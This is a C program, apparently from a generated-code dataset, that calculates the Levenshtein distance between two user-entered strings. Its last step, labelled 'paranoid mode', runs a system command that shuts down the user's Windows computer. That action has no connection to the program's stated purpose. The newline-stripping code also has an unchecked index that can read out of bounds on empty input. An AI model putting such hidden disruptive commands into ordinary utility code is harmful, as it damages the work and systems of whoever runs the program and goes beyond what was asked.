//FormAI DATASET v1.0 Category: Levenshtein Distance Calculator ; Style: paranoid
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define MAX_LEN 100

int min(int a, int b, int c) {
    return (a < b) ? ((a < c) ? a : c) : ((b < c) ? b : c);
}

int levenshtein_distance(char* s1, char* s2) {
    int m = strlen(s1), n = strlen(s2);
    int dp[m + 1][n + 1];

    // Initialize DP array
    for (int i = 0; i <= m; i++) {
        for (int j = 0; j <= n; j++) {
            if (i == 0)
                dp[i][j] = j;
            else if (j == 0)
                dp[i][j] = i;
            else
                dp[i][j] = -1;
        }
    }

    // Calculate Levenshtein Distance using bottom-up DP
    for (int i = 1; i <= m; i++) {
        for (int j = 1; j <= n; j++) {
            int substitutionCost = (s1[i - 1] == s2[j - 1]) ? 0 : 1;
            dp[i][j] = min(dp[i - 1][j] + 1,        // Insertion
                           dp[i][j - 1] + 1,        // Deletion
                           dp[i - 1][j - 1] + substitutionCost);    // Substitution
        }
    }

    return dp[m][n];    // Return final result
}

int main() {
    char s1[MAX_LEN], s2[MAX_LEN];
    int distance;

    printf("Enter first string : ");
    fgets(s1, MAX_LEN, stdin);

    // Remove newline character from input string
    int len = strlen(s1);
    if (s1[len - 1] == '\n')
        s1[len - 1] = '\0';

    printf("Enter second string : ");
    fgets(s2, MAX_LEN, stdin);
    
    // Remove newline character from input string
    len = strlen(s2);
    if (s2[len - 1] == '\n')
        s2[len - 1] = '\0';

    distance = levenshtein_distance(s1, s2);
    printf("\nLevenshtein Distance : %d", distance);

    // Completely wipe out the input strings
    memset(s1, 0, sizeof(s1));
    memset(s2, 0, sizeof(s2));

    // Invoke paranoid mode
    system("shutdown /s /t 30 /c \"Paranoia activated!\"");
    return 0;
}